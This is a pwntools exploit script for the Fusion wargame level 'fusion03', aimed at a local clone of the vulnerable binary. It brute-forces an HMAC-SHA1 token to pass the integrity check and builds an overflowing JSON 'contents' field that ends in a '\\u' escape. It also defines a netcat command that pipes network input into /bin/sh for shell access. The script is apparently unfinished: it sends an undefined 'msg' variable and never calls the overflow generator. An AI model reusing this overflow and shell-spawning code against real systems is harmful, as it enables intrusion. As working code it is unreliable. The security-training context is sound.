from pwn import *
import json
import hmac
from hashlib import sha1

############################################################################################################################################################
# INTERACT WITH LOCAL PROGRAM CLONE FOR DEBUGGING
############################################################################################################################################################



level = "fusion03"

err_log_file = open("/home/kali/CLionPrjects/"+level+"/err.log", 'w')
p = process(["/home/kali/CLionPrjects/"+level+"/cmake-build-debug/"+level], stderr=err_log_file.fileno())

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))


def to_clipboard(data):
    from subprocess import Popen, PIPE
    xsel = Popen(['xsel', '-bi'], stdin=PIPE)
    xsel.communicate(input=data)
    log.info(f"put to clipboard: {data}")


pid = process(["pgrep", level]).recvall()
to_clipboard(pid)


libc = None
elf = None


def init(level):
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"



def gen_payload(token, content,  serverip, title=b"title"):

    while (True):
        rands = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"" + bytes(rands, "utf-8") + b"\", \"tag2\", \"tag3\"], \"title\": \"" \
              + title \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        # log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.debug(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload


def gen_overflow_payload(token, overflow,  serverip, title=b"title"):
    content = b""
    content += buf_filler_char * 1023
    content += b"\\\\u"
    content += overflow
    log.debug(f"content: {content}")
    write("/tmp/docgil", content)
    return gen_payload(token, content, serverip, title=title)



buf_filler_char = b"A"
overflow_char = b"B"



init("03")

cmd = b"/bin/nc -l 4444 | /bin/sh | nc localhost 8080"

# msg = b"{\"tags\": [\"tag1\", \"tag2\", \"tag3\"], \"title\": \"" \
#               + cmd \
#               + b"\", \"contents\": \"" + b"content" \
#               + b"\", \"serverip\": \"" + b"serverip" + b"\"}"

payload = msg

log.info(f"payload: {payload}")

# connect debugger
input("Press Enter to continue...")

p.send(payload)
# send EOF
p.shutdown()
log.info("payload sent")
# p.wait_for_close()

log.info("debug msges from local process:")
try:
    while True:
        log.info(p.recvline().replace(b"\n", b""))
except EOFError:
    print("done")






